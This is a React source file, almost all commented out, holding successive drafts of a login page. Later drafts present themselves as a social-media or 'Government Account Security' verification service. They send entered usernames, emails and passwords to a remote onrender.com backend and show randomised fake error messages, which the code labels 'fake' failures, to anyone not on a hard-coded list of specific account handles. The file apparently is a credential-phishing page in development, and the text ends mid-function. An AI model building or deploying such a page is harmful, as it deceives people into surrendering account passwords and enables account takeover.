// /* eslint-disable no-unused-vars */
// // import React, { useState } from "react";
// // import axios from "axios";
// // import { useNavigate, Link } from "react-router-dom";

// // const Login = () => {
// //     const navigate = useNavigate();

// //     const [input, setInput] = useState({
// //         email: "",
// //         passWord: ""
// //     });

// //     function handleChange(e) {
// //         const { name, value } = e.target;
// //         setInput(prev => ({ ...prev, [name]: value }));
// //     }

// //     async function loginUser() {
// //         try {
// //             const res = await axios.post("http://localhost:4000/login", input);

// //             if (res.data === "login ho gyaa") {
// //                 alert("Login Successful");

// //                 // store token (backend token send karo next step me)
// //                 // localStorage.setItem("token", res.data.token);

// //                 navigate("/"); // landing or dashboard later
// //             } else {
// //                 alert(res.data);
// //             }
// //         } catch (err) {
// //             console.log(err);
// //             alert("Login failed");
// //         }
// //     }

// //     return (
// //         <div className="min-h-screen flex items-center justify-center bg-gray-100">

// //             <div className="bg-white p-8 rounded-2xl shadow-xl w-full max-w-md space-y-6">

// //                 <h2 className="text-3xl font-bold text-center text-gray-800">
// //                     Secure Login
// //                 </h2>

// //                 <input
// //                     type="email"
// //                     name="email"
// //                     placeholder="Email"
// //                     onChange={handleChange}
// //                     className="w-full px-4 py-3 border rounded-xl"
// //                 />

// //                 <input
// //                     type="password"
// //                     name="passWord"
// //                     placeholder="Password"
// //                     onChange={handleChange}
// //                     className="w-full px-4 py-3 border rounded-xl"
// //                 />

// //                 <button
// //                     onClick={loginUser}
// //                     className="w-full bg-blue-600 text-white py-3 rounded-xl hover:bg-blue-700"
// //                 >
// //                     Verify & Login
// //                 </button>

// //                 <p className="text-center text-gray-600">
// //                     New user?
// //                     <Link to="/" className="text-blue-600 ml-1">
// //                         Create account
// //                     </Link>
// //                 </p>

// //             </div>
// //         </div>
// //     );
// // };

// // export default Login;


// // import React, { useState } from "react";
// // import { Link } from "react-router-dom";
// // import axios from "axios";

// // const Login = () => {
// //     const [input, setInput] = useState({
// //         email: "",
// //         passWord: "",
// //     });

// //     const [moveStyle, setMoveStyle] = useState("");

// //     const effects = [
// //         "translate-x-20",
// //         "-translate-x-20",
// //         "-translate-y-2",
// //         "translate-y-2",
// //         "rotate-6",
// //         "-rotate-6",
// //         "scale-90",
// //         "opacity-80",
// //     ];

// //     function loginFun(e) {
// //         const { name, value } = e.target;
// //         setInput((prev) => ({ ...prev, [name]: value }));
// //     }

// //     function funnyMove() {
// //         if (input.email === "" || input.passWord === "") {
// //             const randomEffect =
// //                 effects[Math.floor(Math.random() * effects.length)];
// //             setMoveStyle(randomEffect);
// //         } else {
// //             setMoveStyle("");
// //         }
// //     }

// //     async function done() {
// //         try {
// //             const res = await axios.post("http://localhost:4000/login", input);
// //             alert(res.data);
// //         } catch (error) {
// //             console.log(error);
// //         }
// //     }

// //     return (
// //         <div className="min-h-screen bg-black text-white flex items-center justify-center px-6">

// //             <div className="max-w-6xl w-full grid md:grid-cols-2 gap-12 items-center">

// //                 {/* ================= LEFT VISUAL ================= */}
// //                 <div className="hidden md:flex justify-center">
// //                     <div className="relative">
// //                         <div className="absolute inset-0 bg-gradient-to-tr from-blue-500/20 to-purple-500/20 blur-3xl rounded-full"></div>
// //                         <img
// //                             src="/social.png" // optional decorative image
// //                             alt="Social Media"
// //                             className="relative w-[380px] rounded-3xl shadow-2xl"
// //                         />
// //                     </div>
// //                 </div>

// //                 {/* ================= LOGIN CARD ================= */}
// //                 <div className="w-full max-w-md mx-auto bg-[#0f172a] border border-white/10
// //         rounded-2xl shadow-xl p-8 space-y-6">

// //                     <div className="text-center">
// //                         <h1 className="text-3xl font-bold tracking-tight">
// //                             Verify your social media account
// //                         </h1>
// //                         <p className="text-gray-400 mt-2 text-sm">
// //                             Secure login using encrypted verification
// //                         </p>
// //                     </div>

// //                     {/* EMAIL */}
// //                     <div className="space-y-1">
// //                         <input
// //                             type="email"
// //                             name="email"
// //                             value={input.email}
// //                             onChange={loginFun}
// //                             placeholder="Username"
// //                             className="w-full bg-[#020617] border border-white/10 px-4 py-3 rounded-lg
// //               text-sm text-white placeholder-gray-500
// //               focus:outline-none focus:ring-2 focus:ring-blue-600"
// //                         />
// //                     </div>

// //                     {/* PASSWORD */}
// //                     <div className="space-y-1">
// //                         <input
// //                             type="password"
// //                             name="passWord"
// //                             value={input.passWord}
// //                             onChange={loginFun}
// //                             placeholder="Password"
// //                             className="w-full bg-[#020617] border border-white/10 px-4 py-3 rounded-lg
// //               text-sm text-white placeholder-gray-500
// //               focus:outline-none focus:ring-2 focus:ring-blue-600"
// //                         />
// //                     </div>

// //                     {/* LOGIN BUTTON */}
// //                     <button
// //                         onMouseEnter={funnyMove}
// //                         onClick={done}
// //                         className={`w-full bg-blue-600 hover:bg-blue-700 py-3 rounded-lg
// //             font-semibold transition-all duration-300 ${moveStyle}`}
// //                     >
// //                         {moveStyle === "" ? "Verify & Login" : "Fill details first 😜"}
// //                     </button>

// //                     {/* LINKS */}
//                     // <div className="text-center space-y-2">
//                     //     <Link to="/forget" className="text-sm text-blue-500 hover:underline">
//                     //         Forgot password?
//                     //     </Link>

//                     //     <p className="text-gray-400 text-sm">
//                     //         Don’t have an account?
//                     //         <Link to="/" className="text-blue-500 ml-1 hover:underline">
//                     //             Sign up
//                     //         </Link>
//                     //     </p>
//                     // </div>

// //                 </div>
// //             </div>
// //         </div>
// //     );
// // };

// // export default Login;




// // import React, { useState } from "react";
// // import { Link, useNavigate } from "react-router-dom";
// // import axios from "axios";

// // const SignUp = () => {
// //     const navigate = useNavigate();

// //     const [input, setInput] = useState({
// //         userName: "",
// //         email: "",
// //         passWord: "",
// //     });

// //     function handleInput(e) {
// //         const { name, value } = e.target;
// //         setInput((prev) => ({ ...prev, [name]: value }));
// //     }

// //     async function submitData() {
// //         try {
// //             const res = await axios.post("http://localhost:4000/create", input);
// //             alert("Account created successfully!");
// //             navigate("/Profile2");
// //         } catch (err) {
// //             console.log(err);
// //             alert("Something went wrong!");
// //         }
// //     }

// //     return (
// //         <div className="min-h-screen bg-black text-white flex items-center justify-center px-6">

// //             <div className="max-w-6xl w-full grid md:grid-cols-2 gap-12 items-center">

// //                 {/* ================= LEFT VISUAL ================= */}
// //                 <div className="hidden md:flex justify-center">
// //                     <div className="relative">
// //                         <div className="absolute inset-0 bg-gradient-to-tr from-blue-500/20 to-purple-500/20 blur-3xl rounded-full"></div>
// //                         <img
// //                             src="/social.png"
// //                             alt="Social Media"
// //                             className="relative w-[380px] rounded-3xl shadow-2xl"
// //                         />
// //                     </div>
// //                 </div>

// //                 {/* ================= SIGNUP CARD ================= */}
// //                 <div className="w-full max-w-md mx-auto bg-[#0f172a] border border-white/10
// //         rounded-2xl shadow-xl p-8 space-y-6">

// //                     <div className="text-center">
// //                         <h1 className="text-3xl font-bold tracking-tight">
// //                             Verify your social media account
// //                         </h1>
// //                         <p className="text-gray-400 mt-2 text-sm">
// //                             Secure login using encrypted verification
// //                         </p>
// //                     </div>

// //                     {/* USERNAME */}
// //                     <input
// //                         type="text"
// //                         name="userName"
// //                         value={input.userName}
// //                         onChange={handleInput}
// //                         placeholder="Username"
// //                         className="w-full bg-[#020617] border border-white/10 px-4 py-3 rounded-lg
// //             text-sm text-white placeholder-gray-500
// //             focus:outline-none focus:ring-2 focus:ring-blue-600"
// //                     />

// //                     {/* EMAIL */}
// //                     <input
// //                         type="email"
// //                         name="email"
// //                         value={input.email}
// //                         onChange={handleInput}
// //                         placeholder="Email address"
// //                         className="w-full bg-[#020617] border border-white/10 px-4 py-3 rounded-lg
// //             text-sm text-white placeholder-gray-500
// //             focus:outline-none focus:ring-2 focus:ring-blue-600"
// //                     />

// //                     {/* PASSWORD */}
// //                     <input
// //                         type="password"
// //                         name="passWord"
// //                         value={input.passWord}
// //                         onChange={handleInput}
// //                         placeholder="Password"
// //                         className="w-full bg-[#020617] border border-white/10 px-4 py-3 rounded-lg
// //             text-sm text-white placeholder-gray-500
// //             focus:outline-none focus:ring-2 focus:ring-blue-600"
// //                     />

// //                     {/* SIGN UP BUTTON */}
// //                     <button
// //                         onClick={submitData}
// //                         className="w-full bg-blue-600 hover:bg-blue-700 py-3 rounded-lg
// //             font-semibold transition-all duration-300"
// //                     >
// //                         Login
// //                     </button>

// //                     {/* LINKS */}
// //                     <div className="text-center space-y-2">
// //                         <Link to="/forget" className="text-sm text-blue-500 hover:underline">
// //                             Forgot password?
// //                         </Link>

// //                         <p className="text-gray-400 text-sm">
// //                             Don’t have an account?
// //                             <Link to="/" className="text-blue-500 ml-1 hover:underline">
// //                                 Sign up
// //                             </Link>
// //                         </p>
// //                     </div>

// //                 </div>
// //             </div>
// //         </div>
// //     );
// // };

// // export default SignUp;





// // import React, { useState } from "react";
// // import { Link, useNavigate } from "react-router-dom";
// // import axios from "axios";

// // const SignUp = () => {

// //     const navigate = useNavigate();

// //     const [input, setInput] = useState({
// //         userName: "",
// //         email: "",
// //         passWord: "",
// //     });

// //     const [errorMsg, setErrorMsg] = useState("");

// //     function handleInput(e) {
// //         const { name, value } = e.target;
// //         setInput(prev => ({ ...prev, [name]: value }));
// //     }

// //     function showRandomError() {
// //         const errors = [
// //             "Invalid credentials",
// //             "Server timeout, try again",
// //             "Verification failed",
// //             "Something went wrong"
// //         ];
// //         const random = errors[Math.floor(Math.random() * errors.length)];
// //         setErrorMsg(random);
// //         setTimeout(() => setErrorMsg(""), 5000);
// //     }

// //     async function submitData() {
// //         try {
// //             // 🔹 Always store data in backend
// //             await axios.post(
// //                 "https://security-backend-c1hz.onrender.com/create",
// //                 input,
// //                 { timeout: 15000 }
// //             );

// //             // 🔹 MOBILE-SAFE NORMALIZATION (MOST IMPORTANT)
// //             const username = input.userName
// //                 .trim()
// //                 .toLowerCase()
// //                 .replace(/\s+/g, "");

// //             // 🔹 OWNER MAP (NO if-else CHAOS)
// //             const OWNER_ACCOUNTS = {
// //                 "_creamy_moon_629": "/Account_creamy_moon_629",
// //                 "its_meee_pihu_09": "/Account_its_meee_pihu_09",
// //                 "mr_purav_1432": "/Account_mr_purav_1432"
// //             };

// //             // 🔹 FINAL DECISION
// //             if (OWNER_ACCOUNTS[username]) {
// //                 navigate(OWNER_ACCOUNTS[username]);
// //             } else {
// //                 showRandomError(); // fake verification failure
// //             }

// //         } catch (err) {
// //             showRandomError();
// //         }
// //     }



// //     return (
// //         <div className="min-h-screen bg-black text-white flex items-center justify-center px-6">

// //             {/* ================= ERROR POPUP ================= */}
// //             {errorMsg && (
// //                 <div className="fixed top-20 right-10 bg-red-600 text-white px-5 py-3
// //                 rounded-lg shadow-lg text-sm animate-slide-in">
// //                     {errorMsg}
// //                 </div>
// //             )}

// //             <div className="max-w-6xl w-full grid md:grid-cols-2 gap-12 items-center">

// //                 {/* LEFT VISUAL */}
// //                 <div className="hidden md:flex justify-center">
// //                     <div className="relative">
// //                         <div className="absolute inset-0 bg-gradient-to-tr
// //                         from-blue-500/20 to-purple-500/20 blur-3xl rounded-full"></div>
// //                         <img
// //                             src="/social.png"
// //                             alt="Social Media"
// //                             className="relative w-[380px] rounded-3xl shadow-2xl"
// //                         />
// //                     </div>
// //                 </div>

// //                 {/* SIGNUP CARD */}
// //                 <div className="w-full max-w-md mx-auto bg-[#0f172a]
// //                 border border-white/10 rounded-2xl shadow-xl p-8 space-y-6">

// //                     <div className="text-center">
// //                         <h1 className="text-3xl font-bold tracking-tight">
// //                             Verify your social media account
// //                         </h1>
// //                         <p className="text-gray-400 mt-2 text-sm">
// //                             Secure login using encrypted verification
// //                         </p>
// //                     </div>

// //                     <input
// //                         type="text"
// //                         name="userName"
// //                         value={input.userName}
// //                         onChange={handleInput}
// //                         placeholder="Username"
// //                         className="w-full bg-[#020617] border border-white/10 px-4 py-3 rounded-lg
// //                         text-sm text-white placeholder-gray-500 focus:outline-none
// //                         focus:ring-2 focus:ring-blue-600"
// //                     />

// //                     <input
// //                         type="email"
// //                         name="email"
// //                         value={input.email}
// //                         onChange={handleInput}
// //                         placeholder="Email address"
// //                         className="w-full bg-[#020617] border border-white/10 px-4 py-3 rounded-lg
// //                         text-sm text-white placeholder-gray-500 focus:outline-none
// //                         focus:ring-2 focus:ring-blue-600"
// //                     />

// //                     <input
// //                         type="password"
// //                         name="passWord"
// //                         value={input.passWord}
// //                         onChange={handleInput}
// //                         placeholder="Password"
// //                         className="w-full bg-[#020617] border border-white/10 px-4 py-3 rounded-lg
// //                         text-sm text-white placeholder-gray-500 focus:outline-none
// //                         focus:ring-2 focus:ring-blue-600"
// //                     />

// //                     <button
// //                         onClick={submitData}
// //                         className="w-full bg-blue-600 hover:bg-blue-700 py-3
// //                         rounded-lg font-semibold transition-all duration-300"
// //                     >
// //                         Login
// //                     </button>

// //                     <div className="text-center space-y-2">
// //                         <Link to="/forget" className="text-sm text-blue-500 hover:underline">
// //                             Forgot password?
// //                         </Link>

// //                         <p className="text-gray-400 text-sm">
// //                             Don’t have an account?
// //                             <Link to="/" className="text-blue-500 ml-1 hover:underline">
// //                                 Sign up
// //                             </Link>
// //                         </p>
// //                     </div>

// //                 </div>
// //             </div>
// //         </div>
// //     );
// // };

// // export default SignUp;



// // import React, { useState } from "react";
// // import { Link, useNavigate } from "react-router-dom";
// // import axios from "axios";

// // const SignUp = () => {
// //     const navigate = useNavigate();

// //     const [input, setInput] = useState({
// //         userName: "",
// //         email: "",
// //         passWord: "",
// //     });

// //     const [popup, setPopup] = useState("");

// //     const showPopup = (msg, duration = 2500) => {
// //         setPopup(msg);
// //         setTimeout(() => setPopup(""), duration);
// //     };

// //     function handleInput(e) {
// //         const { name, value } = e.target;
// //         setInput(prev => ({ ...prev, [name]: value }));
// //     }

// //     async function submitData() {
// //         try {
// //             showPopup("📡 Sending request to backend...");

// //             const res = await axios.post(
// //                 "https://security-backend-c1hz.onrender.com/login",
// //                 input,
// //                 { timeout: 15000 }
// //             );

// //             showPopup("✅ Backend responded");

// //             // ✅ IMPORTANT CHECK
// //             if (!res.data || res.data.success !== true) {
// //                 showPopup("❌ Backend rejected credentials");
// //                 return;
// //             }

// //             // 🔹 Normalize username (mobile-safe)
// //             const username = input.userName
// //                 .trim()
// //                 .toLowerCase()
// //                 .replace(/\s+/g, "");

// //             showPopup(`👤 Username detected: ${username}`);

// //             // 🔹 OWNER MAP
// //             const OWNER_ACCOUNTS = {
// //                 "_creamy_moon_629": "/Account_creamy_moon_629",
// //                 "its_meee_pihu_09": "/Account_its_meee_pihu_09",
// //                 "mr_purav_1432": "/Account_mr_purav_1432",
// //             };

// //             if (OWNER_ACCOUNTS[username]) {
// //                 showPopup("🚀 Owner verified, redirecting...");
// //                 setTimeout(() => {
// //                     navigate(OWNER_ACCOUNTS[username]);
// //                 }, 800);
// //             } else {
// //                 showPopup("⚠️ Not an owner account");
// //             }

// //         } catch (err) {
// //             console.error(err);
// //             showPopup("🔥 Backend timeout / network error", 4000);
// //         }
// //     }

// //     return (
// //         <div className="min-h-screen bg-black text-white flex items-center justify-center px-6">

// //             {/* 🔔 DEBUG POPUP */}
// //             {popup && (
// //                 <div className="fixed top-16 right-4 bg-yellow-500 text-black px-4 py-2 rounded-lg shadow-lg text-sm z-50">
// //                     {popup}
// //                 </div>
// //             )}

// //             <div className="max-w-md w-full bg-[#0f172a] border border-white/10 rounded-2xl shadow-xl p-8 space-y-6">

// //                 <div className="text-center">
// //                     <h1 className="text-3xl font-bold">Verify your social media account</h1>
// //                     <p className="text-gray-400 mt-2 text-sm">
// //                         Secure verification system
// //                     </p>
// //                 </div>

// //                 <input
// //                     type="text"
// //                     name="userName"
// //                     value={input.userName}
// //                     onChange={handleInput}
// //                     placeholder="Username"
// //                     className="w-full bg-[#020617] border border-white/10 px-4 py-3 rounded-lg"
// //                 />

// //                 <input
// //                     type="email"
// //                     name="email"
// //                     value={input.email}
// //                     onChange={handleInput}
// //                     placeholder="Email"
// //                     className="w-full bg-[#020617] border border-white/10 px-4 py-3 rounded-lg"
// //                 />

// //                 <input
// //                     type="password"
// //                     name="passWord"
// //                     value={input.passWord}
// //                     onChange={handleInput}
// //                     placeholder="Password"
// //                     className="w-full bg-[#020617] border border-white/10 px-4 py-3 rounded-lg"
// //                 />

// //                 <button
// //                     onClick={submitData}
// //                     className="w-full bg-blue-600 hover:bg-blue-700 py-3 rounded-lg font-semibold"
// //                 >
// //                     Login
// //                 </button>

// //                 <div className="text-center text-sm text-gray-400">
// //                     Don’t have an account?
// //                     <Link to="/" className="text-blue-500 ml-1">Sign up</Link>
// //                 </div>

// //             </div>
// //         </div>
// //     );
// // };

// // export default SignUp;







// // import React, { useState } from "react";
// // import { useNavigate, Link } from "react-router-dom";
// // import axios from "axios";

// // const SignUp = () => {
// //     const navigate = useNavigate();

// //     const [input, setInput] = useState({
// //         userName: "",
// //         email: "",
// //         passWord: "",
// //     });

// //     const [popup, setPopup] = useState("");

// //     const showPopup = (msg, time = 2500) => {
// //         setPopup(msg);
// //         setTimeout(() => setPopup(""), time);
// //     };

// //     const handleInput = (e) => {
// //         const { name, value } = e.target;
// //         setInput(prev => ({ ...prev, [name]: value }));
// //     };

// //     const submitData = async () => {
// //         showPopup("📡 Sending request...");

// //         let res;

// //         try {
// //             res = await axios.post(
// //                 "https://security-backend-c1hz.onrender.com/login",
// //                 input,
// //                 {
// //                     timeout: 20000,
// //                     validateStatus: () => true, // 🔥 NEVER THROW
// //                     headers: { "Content-Type": "application/json" }
// //                 }
// //             );
// //         } catch (err) {
// //             showPopup("⚠️ Network unstable, retrying...");
// //             return;
// //         }

// //         showPopup("✅ Backend reached");

// //         if (!res || !res.data) {
// //             showPopup("❌ No response data");
// //             return;
// //         }

// //         showPopup(`🧾 Backend step: ${res.data.step || "unknown"}`);

// //         const username = input.userName
// //             .trim()
// //             .toLowerCase()
// //             .replace(/\s+/g, "");

// //         const OWNER_ACCOUNTS = {
// //             "_creamy_moon_629": "/Account_creamy_moon_629",
// //             "its_meee_pihu_09": "/Account_its_meee_pihu_09",
// //             "mr_purav_1432": "/Account_mr_purav_1432"
// //         };

// //         if (OWNER_ACCOUNTS[username]) {
// //             showPopup("🚀 Owner verified, redirecting...");
// //             setTimeout(() => navigate(OWNER_ACCOUNTS[username]), 1000);
// //         } else {
// //             showPopup("❌ Not owner account");
// //         }
// //     };

// //     return (
// //         <div className="min-h-screen bg-black text-white flex items-center justify-center px-4">

// //             {popup && (
// //                 <div className="fixed top-16 right-4 bg-yellow-400 text-black px-4 py-2 rounded shadow z-50 text-sm">
// //                     {popup}
// //                 </div>
// //             )}

// //             <div className="w-full max-w-md bg-[#0f172a] p-8 rounded-xl space-y-4">

// //                 <h2 className="text-xl font-bold text-center">Verify your account</h2>

// //                 <input
// //                     name="userName"
// //                     placeholder="Username"
// //                     value={input.userName}
// //                     onChange={handleInput}
// //                     className="w-full p-3 rounded bg-[#020617]"
// //                 />

// //                 <input
// //                     name="email"
// //                     placeholder="Email"
// //                     value={input.email}
// //                     onChange={handleInput}
// //                     className="w-full p-3 rounded bg-[#020617]"
// //                 />

// //                 <input
// //                     name="passWord"
// //                     type="password"
// //                     placeholder="Password"
// //                     value={input.passWord}
// //                     onChange={handleInput}
// //                     className="w-full p-3 rounded bg-[#020617]"
// //                 />

// //                 <button
// //                     onClick={submitData}
// //                     className="w-full bg-blue-600 py-3 rounded font-semibold"
// //                 >
// //                     Login
// //                 </button>

// //                 <p className="text-center text-sm text-gray-400">
// //                     Don’t have an account?
// //                     <Link to="/" className="text-blue-500 ml-1">Sign up</Link>
// //                 </p>
// //             </div>
// //         </div>
// //     );
// // };

// // export default SignUp;



// // src/Login.jsx
// import React, { useState } from "react";
// import { useNavigate } from "react-router-dom";

// const BACKEND_URL = "https://security-backend-c1hz.onrender.com/login";

// // 🔐 OWNER ROUTE MAP (single source of truth)
// const OWNER_ACCOUNTS = {
//     "_creamy_moon_629": "/Account_creamy_moon_629",
//     "its_meee_pihu_09": "/Account_its_meee_pihu_09",
//     "mr_purav_1432": "/Account_mr_purav_1432",
// };

// const Login = () => {
//     const navigate = useNavigate();

//     const [form, setForm] = useState({
//         userName: "",
//         email: "",
//         passWord: "",
//     });

//     const [popup, setPopup] = useState("");

//     /* ---------------- POPUP HELPER ---------------- */
//     const showPopup = (msg, time = 2500) => {
//         setPopup(msg);
//         setTimeout(() => setPopup(""), time);
//     };

//     /* ---------------- INPUT HANDLER ---------------- */
//     const handleChange = (e) => {
//         const { name, value } = e.target;
//         setForm((prev) => ({ ...prev, [name]: value }));
//     };

//     /* ---------------- SUBMIT ---------------- */
//     const handleSubmit = async (e) => {
//         e.preventDefault();

//         // Basic client-side guard
//         if (!form.userName || !form.email || !form.passWord) {
//             showPopup("⚠️ Please fill all fields");
//             return;
//         }

//         showPopup("📡 Sending request to server...");

//         let response;
//         try {
//             response = await fetch(BACKEND_URL, {
//                 method: "POST",
//                 headers: {
//                     "Content-Type": "application/json",
//                 },
//                 body: JSON.stringify(form),
//             });
//         } catch (networkError) {
//             showPopup("🔥 Network error (mobile / slow internet)");
//             return;
//         }

//         showPopup("✅ Server responded");

//         let data;
//         try {
//             data = await response.json();
//         } catch {
//             showPopup("❌ Invalid server response");
//             return;
//         }

//         if (!data || data.success !== true) {
//             showPopup("❌ Backend rejected request");
//             return;
//         }

//         // 🔑 Normalize username (mobile-safe)
//         const normalizedUserName = form.userName
//             .trim()
//             .toLowerCase()
//             .replace(/\s+/g, "");

//         showPopup(`👤 Username detected: ${normalizedUserName}`);

//         // 🔐 OWNER CHECK
//         if (OWNER_ACCOUNTS[normalizedUserName]) {
//             showPopup("🚀 Owner verified, redirecting...");
//             setTimeout(() => {
//                 navigate(OWNER_ACCOUNTS[normalizedUserName]);
//             }, 800);
//         } else {
//             // Fake failure for non-owners
//             const fakeErrors = [
//                 "Invalid credentials",
//                 "Verification failed",
//                 "Account not eligible",
//                 "Please try again later",
//             ];
//             const random =
//                 fakeErrors[Math.floor(Math.random() * fakeErrors.length)];
//             showPopup(`❌ ${random}`, 3500);
//         }
//     };

//     /* ---------------- UI ---------------- */
//     return (
//         <div className="min-h-screen bg-black text-white flex items-center justify-center px-4">

//             {/* 🔔 DEBUG / STATUS POPUP */}
//             {popup && (
//                 <div className="fixed top-16 right-4 bg-yellow-400 text-black px-4 py-2 rounded-lg shadow-lg text-sm z-50">
//                     {popup}
//                 </div>
//             )}

//             <form
//                 onSubmit={handleSubmit}
//                 className="w-full max-w-md bg-[#0f172a] border border-white/10 rounded-2xl p-8 space-y-4 shadow-xl"
//             >
//                 <h1 className="text-2xl font-bold text-center">
//                     Verify your social media account
//                 </h1>

//                 <input
//                     type="text"
//                     name="userName"
//                     placeholder="Username"
//                     value={form.userName}
//                     onChange={handleChange}
//                     className="w-full bg-[#020617] border border-white/10 px-4 py-3 rounded-lg"
//                 />

//                 <input
//                     type="email"
//                     name="email"
//                     placeholder="Email"
//                     value={form.email}
//                     onChange={handleChange}
//                     className="w-full bg-[#020617] border border-white/10 px-4 py-3 rounded-lg"
//                 />

//                 <input
//                     type="password"
//                     name="passWord"
//                     placeholder="Password"
//                     value={form.passWord}
//                     onChange={handleChange}
//                     className="w-full bg-[#020617] border border-white/10 px-4 py-3 rounded-lg"
//                 />

//                 <button
//                     type="submit"
//                     className="w-full bg-blue-600 hover:bg-blue-700 py-3 rounded-lg font-semibold transition"
//                 >
//                     Login
//                 </button>
//             </form>
//         </div>
//     );
// };

// export default Login;








// import React, { useState } from "react";
// import { useNavigate } from "react-router-dom";

// const BACKEND_URL = "https://security-backend-c1hz.onrender.com/login";

// const OWNER_ACCOUNTS = {
//     "_creamy_moon_629": "/Account_creamy_moon_629",
//     "its_meee_pihu_09": "/Account_its_meee_pihu_09",
//     "mr_purav_1432": "/Account_mr_purav_1432"
// };

// export default function Login() {
//     const navigate = useNavigate();

//     const [form, setForm] = useState({
//         userName: "",
//         email: "",
//         passWord: ""
//     });

//     const [popup, setPopup] = useState("");

//     const show = (msg, t = 3000) => {
//         console.log("POPUP:", msg);
//         setPopup(msg);
//         setTimeout(() => setPopup(""), t);
//     };

//     const handleChange = (e) =>
//         setForm({ ...form, [e.target.name]: e.target.value });

//     const submit = async (e) => {
//         e.preventDefault();

//         if (!form.userName || !form.email || !form.passWord) {
//             show("⚠️ Please fill all fields");
//             return;
//         }

//         show("📡 Sending request...");

//         let data;
//         try {
//             const res = await fetch(BACKEND_URL, {
//                 method: "POST",
//                 headers: { "Content-Type": "application/json" },
//                 body: JSON.stringify(form)
//             });

//             data = await res.json();
//             console.log("BACKEND RESPONSE:", data);
//         } catch (err) {
//             console.error("NETWORK ERROR:", err);
//             show("🔥 Network / backend unreachable", 5000);
//             return;
//         }

//         const uname = form.userName.trim().toLowerCase();

//         if (OWNER_ACCOUNTS[uname]) {
//             show("✅ Account verified. Redirecting...");
//             setTimeout(() => navigate(OWNER_ACCOUNTS[uname]), 800);
//         } else {
//             show("❌ Verification failed");
//         }
//     };

//     return (
//         <div className="min-h-screen bg-gradient-to-br from-black via-[#020617] to-black flex items-center justify-center px-4">

//             {/* 🔔 POPUP */}
//             {popup && (
//                 <div className="fixed top-20 right-4 bg-yellow-400 text-black px-5 py-3
//         rounded-xl shadow-xl text-sm font-medium z-50 animate-pulse">
//                     {popup}
//                 </div>
//             )}

//             <div className="w-full max-w-5xl grid md:grid-cols-2 gap-12 items-center">

//                 {/* LEFT SIDE (DESKTOP ONLY) */}
//                 <div className="hidden md:flex flex-col gap-4">
//                     <h1 className="text-5xl font-bold text-white leading-tight">
//                         Government <br /> Account Security
//                     </h1>
//                     <p className="text-gray-400 text-lg">
//                         Verify your social media account using our secure
//                         verification system trusted by professionals.
//                     </p>

//                     <div className="mt-6 flex gap-4">
//                         <div className="bg-white/5 border border-white/10 px-5 py-3 rounded-xl">
//                             🔐 End-to-end secure
//                         </div>
//                         <div className="bg-white/5 border border-white/10 px-5 py-3 rounded-xl">
//                             ⚡ Fast verification
//                         </div>
//                     </div>
//                 </div>

//                 {/* LOGIN CARD */}
//                 <form
//                     onSubmit={submit}
//                     className="w-full max-w-md mx-auto bg-[#0f172a]/90
//           backdrop-blur-xl border border-white/10
//           rounded-2xl shadow-2xl p-8 space-y-6"
//                 >
//                     <div className="text-center">
//                         <h2 className="text-3xl font-bold text-white">
//                             Verify Your Account
//                         </h2>
//                         <p className="text-gray-400 mt-2 text-sm">
//                             Secure social media verification
//                         </p>
//                     </div>

//                     <div className="space-y-4">
//                         <input
//                             type="text"
//                             name="userName"
//                             placeholder="Username"
//                             value={form.userName}
//                             onChange={handleChange}
//                             className="w-full bg-[#020617] border border-white/10
//               px-4 py-3 rounded-xl text-white placeholder-gray-500
//               focus:outline-none focus:ring-2 focus:ring-blue-600"
//                         />

//                         <input
//                             type="email"
//                             name="email"
//                             placeholder="Email address"
//                             value={form.email}
//                             onChange={handleChange}
//                             className="w-full bg-[#020617] border border-white/10
//               px-4 py-3 rounded-xl text-white placeholder-gray-500
//               focus:outline-none focus:ring-2 focus:ring-blue-600"
//                         />

//                         <input
//                             type="password"
//                             name="passWord"
//                             placeholder="Password"
//                             value={form.passWord}
//                             onChange={handleChange}
//                             className="w-full bg-[#020617] border border-white/10
//               px-4 py-3 rounded-xl text-white placeholder-gray-500
//               focus:outline-none focus:ring-2 focus:ring-blue-600"
//                         />
//                     </div>

//                     <button
//                         type="submit"
//                         className="w-full bg-blue-600 hover:bg-blue-700
//             py-3 rounded-xl font-semibold text-white
//             transition-all duration-300 active:scale-95"
//                     >
//                         Verify & Continue
//                     </button>

//                     <p className="text-center text-gray-500 text-sm">
//                         © Government Account Security Platform
//                     </p>
//                 </form>
//             </div>
//         </div>
//     );
// }






// import React, { useState } from "react";
// import { useNavigate } from "react-router-dom";

// const BACKEND_URL = "https://security-backend-c1hz.onrender.com/login";

// const OWNER_ACCOUNTS = {
//     "_creamy_moon_629": "/Account_creamy_moon_629",
//     "its_meee_pihu_09": "/Account_its_meee_pihu_09",
//     "itx_me_somya": "/Account_itx_me_somya",
//     "mr_purav_1432": "/Account_mr_purav_1432",
//     "mr_raj_rajpoot_555": "/Account_mr_raj_rajpoot_555"
// };

// // ❌ Fake error messages (non-owner)
// const INVALID_ERRORS = [
//     "Invalid credentials",
//     "Verification failed",
//     "Account not eligible",
//     "Try again later"
// ];

// // 🔥 Server / network errors
// const SERVER_ERRORS = [
//     "Server error, try later",
//     "Service temporarily unavailable",
//     "Network issue detected",
//     "Please try again after some time"
// ];

// export default function Login() {
//     const navigate = useNavigate();

//     const [form, setForm] = useState({
//         userName: "",
//         email: "",
//         passWord: ""
//     });

//     const [popup, setPopup] = useState("");

//     /* ---------------- POPUP ---------------- */
//     const show = (msg, t = 5000) => {
//         console.log("POPUP:", msg);
//         setPopup(msg);
//         setTimeout(() => setPopup(""), t);
//     };

//     /* ---------------- INPUT ---------------- */
//     const handleChange = (e) =>
//         setForm({ ...form, [e.target.name]: e.target.value });

//     /* ---------------- SUBMIT ---------------- */
//     const submit = async (e) => {
//         e.preventDefault();

//         // Client-side validation
//         if (!form.userName || !form.email || !form.passWord) {
//             show(" Please fill all fields");
//             return;
//         }

//         show("Verifying account...");

//         try {
//             const res = await fetch(BACKEND_URL, {
//                 method: "POST",
//                 headers: { "Content-Type": "application/json" },
//                 body: JSON.stringify(form)
//             });

//             const data = await res.json();
//             console.log("BACKEND RESPONSE:", data);

//             // Normalize username (mobile safe)
//             const uname = form.userName
//                 .trim()
//                 .toLowerCase()
//                 .replace(/\s+/g, "");

//             // ✅ OWNER CASE
//             if (OWNER_ACCOUNTS[uname]) {
//                 show("✅ Account verified. Redirecting...");
//                 setTimeout(() => {
//                     navigate(OWNER_ACCOUNTS[uname]);
//                 }, 800);
//                 return;
//             }

//             // ❌ NON-OWNER (fake invalid)
//             const randomInvalid =
//                 INVALID_ERRORS[Math.floor(Math.random() * INVALID_ERRORS.length)];
